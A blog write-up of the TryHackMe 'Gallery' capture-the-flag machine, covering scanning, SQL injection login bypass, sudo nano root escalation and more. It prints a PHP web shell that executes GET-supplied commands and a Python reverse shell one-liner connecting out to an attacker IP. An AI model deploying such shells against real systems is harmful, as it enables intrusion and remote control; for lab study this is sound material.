---
layout: post
title: Gallery - TryHackMe write-up
---

Write-up for Gallery TryHackMe CTF
Hi hackers, today I'm gonna writeup gallery, an easy TryHackMe CTF.

## User
First I did some port scanning with rustscan and nmap (learn [here](https://book.hacktricks.xyz/pentesting/pentesting-network#scanning-hosts) more about port scanning)
```
$ rustscan -a gallery.thm -t 2000
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/ubuntu/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.241.136:80
Open 10.10.241.136:8080
$ nmap -p80,8080 -A -oN port.txt -T4 gallery.thm
Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-24 16:44 CEST
Nmap scan report for gallery.thm (10.10.241.136)
Host is up (0.12s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
8080/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Simple Image Gallery System

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.46 seconds
```
<br>
Rustscan found two open ports 80 and 8080, apache default pages was hosted on port 80

![apachedefault](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_1/apachedefault.png)

<br>
So, I enumerated directory with dirsearch

```
$ dirsearch -u http://gallery.thm -w $LIST/directory/dir.txt -o directory

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 329449

Output File: /home/ubuntu/ctf/tmp/80/directory

Error Log: /home/ubuntu/.local/lib/python3.9/site-packages/dirsearch/logs/errors-22-04-24_16-56-02.log

Target: http://gallery.thm/

[16:56:02] Starting: 
[16:56:42] 301 -  312B  - /gallery  ->  http://gallery.thm/gallery/
[16:57:21] 403 -  276B  - /server-status
[16:57:51] 200 -   11KB - /index.html

Task Completed
<dirsearch.dirsearch.Program object at 0x7f8e6d9c7700>
```
The directory gallery redirect to a login page
![loginpage.png](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_1/loginpage.png)

I checked if it was vulnerable to LDAP injection, SQL injection, XPath injection and it was vulnerable to SQL injection
![sqli.png](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_1/sqli.png)

and I gain access to the admin panel.
Then, I started testing admin panel function and I noticed a function allowing upload avatar image so I tried uploading this web shell:
```
<?php
	$cmd=$_GET["cmd"];
	echo system("$cmd");
?>
```
![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_1/schermata.png)

![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_1/directorylistabile.png)

![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_1/webshell.png)

It worked! 
Then I started a listener on my machine with nc:
```
$ rlwrap nc -nlvp 4444
```
and I executed the following reverse shell on the web shell I uploaded:
```
$ python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.53.247",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

So I got a reverse shell
Then I run linpeas to find somethings, and it found mike's password:
![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_1/linpeas.png)

it worked and I got user.txt

## Getting admin hash
We also need to find admin hash, so I started looking for database password in web root and I found a file called initialize.php containing it
![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_1/sqlpwd.png)
Then we can log in database and dump users' hashes
![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_1/hash.png)

We got it!

## Root
Once we got user.txt our goal is to get root, running sudo -l I noticed we can executed /opt/rootkit.sh as root
![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_1/sudo-l.png)

/opt/rootkit.sh allows us to execute nano as root if we select option read, we can exploit it to spawn a root shell
![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_1/nanoroot.png)

It worked, we got root!

![](https://raw.githubusercontent.com/0xShushu/0xShushu.github.io/master/_posts/img_1/root.png)

See you at the next post, keep hacking 
